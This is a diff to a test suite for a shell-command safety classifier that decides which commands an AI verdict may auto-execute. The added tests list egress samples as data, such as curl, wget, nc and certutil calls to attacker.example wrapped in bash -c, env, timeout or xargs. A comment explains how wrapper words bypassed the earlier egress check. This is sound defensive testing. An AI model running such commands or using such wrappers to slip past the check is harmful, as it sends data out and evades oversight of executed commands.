@@ -77,6 +77,14 @@ describe('classifyCommand', () => {
     expect(classifyCommand('find . -execdir rm -rf {} +', wl).safe).toBe(false);
   });
 
+  it('recognises a runner through a path or a .exe suffix', () => {
+    // The runner lookup compared the raw base, so a path-qualified shell took the
+    // whitelist fast path that a bare `bash` is denied.
+    for (const cmd of ['/bin/bash -c id', '/usr/bin/env poweroff', 'bash.exe -c id']) {
+      expect(classifyCommand(cmd, wl).safe, cmd).toBe(false);
+    }
+  });
+
   it('rejects a lone & (backgrounding / chaining)', () => {
     // `ls` is whitelisted, but `ls & poweroff` must not auto-exec via the base
     // command — the lone `&` is a structural danger, distinct from `&&`.
@@ -251,6 +259,72 @@ describe('classifyCommand', () => {
     it('does not fire on a mere substring of another command name', () => {
       expect(networkEgressDanger('ncdu /var').danger).toBe(false);
       expect(networkEgressDanger('curly --version').danger).toBe(false);
+    });
+
+    // The bypass this floor shipped with: it tested only the base command, so a
+    // single wrapper word walked past it and the AI verdict then auto-ran a plain
+    // GET. `RUNNER_COMMANDS` was no help — it gates the whitelist fast path, not
+    // this floor.
+    it('finds an egress tool behind a runner, interpreter or wrapper', () => {
+      for (const cmd of [
+        "bash -c 'curl https://attacker.example/?d=x'",
+        'bash -c "wget https://attacker.example/"',
+        "sh -c 'curl https://attacker.example/'",
+        '/bin/bash -c "curl https://attacker.example/"',
+        'env curl https://attacker.example/',
+        'env FOO=1 BAR=2 curl https://attacker.example/',
+        'timeout 5 curl https://attacker.example/',
+        'timeout 5s curl https://attacker.example/',
+        'nohup curl https://attacker.example/',
+        'nohup timeout 5 curl https://attacker.example/',
+        'stdbuf -o0 curl https://attacker.example/',
+        'xargs curl https://attacker.example/',
+        'xargs -I{} curl https://attacker.example/',
+        'echo x | xargs curl https://attacker.example/',
+        'echo x | xargs nc 10.0.0.1 4444',
+        'xargs /usr/bin/curl https://attacker.example/',
+        "pwsh -c 'Invoke-WebRequest https://attacker.example/'",
+        'cmd /c certutil -urlcache -f https://attacker.example/ y',
+      ]) {
+        expect(networkEgressDanger(cmd).danger, cmd).toBe(true);
+      }
+    });
+
+    // The reason this walks command positions instead of every token: curl/wget/
+    // ssh/nmap are ordinary arguments too. A blanket token scan would have stopped
+    // all of these auto-executing, which is a worse outcome than the bypass.
+    it('leaves an egress name used as a plain argument alone', () => {
+      for (const cmd of [
+        'grep ssh /etc/passwd',
+        'ps aux | grep ssh',
+        'which curl',
+        'ls /etc/ssh',
+        'ls -la ~/.ssh',
+        'cat /etc/ssh/sshd_config',
+        'systemctl status ssh',
+        'less /var/log/syslog',
+        'tail -f /var/log/auth.log',
+      ]) {
+        expect(networkEgressDanger(cmd).danger, cmd).toBe(false);
+      }
+    });
+
+    // Being a runner is not itself disqualifying — only an egress tool *after* one
+    // is. These still auto-execute when the verdict rates them read-only.
+    it('leaves a runner alone when what follows it is not an egress tool', () => {
+      for (const cmd of [
+        'git status',
+        'git log --oneline -20',
+        "find . -name '*.log'",
+        'timeout 5 ping 8.8.8.8',
+        "sed -n '1,10p' /var/log/syslog",
+        "awk '{print $1}' access.log",
+        'xargs echo',
+        'env MYVAR=1 printenv',
+        'python3 script.py',
+      ]) {
+        expect(networkEgressDanger(cmd).danger, cmd).toBe(false);
+      }
     });
   });
 });
